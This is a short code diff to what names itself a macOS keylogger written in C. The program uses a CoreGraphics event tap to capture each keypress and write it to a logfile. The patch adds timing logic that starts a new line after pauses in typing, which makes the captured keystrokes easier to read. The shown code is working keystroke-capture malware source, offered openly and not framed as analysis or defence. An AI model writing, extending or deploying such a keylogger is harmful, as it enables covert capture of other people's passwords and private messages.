@@ -1,5 +1,7 @@
 #include "keylogger.h"
 
+time_t last_time = 0;
+
 int main(int argc, const char *argv[]) {
 
     // Create an event tap to retrieve keypresses.
@@ -60,8 +62,13 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
+    time_t curr_time = time(0);
+    if (curr_time - last_time > 1) {
+         fprintf(logfile, "\n");
+    }       
     // Print the human readable key to the logfile.
     fprintf(logfile, "%s", convertKeyCode(keyCode));
+    last_time = curr_time;
     fflush(logfile);
 
     return event;
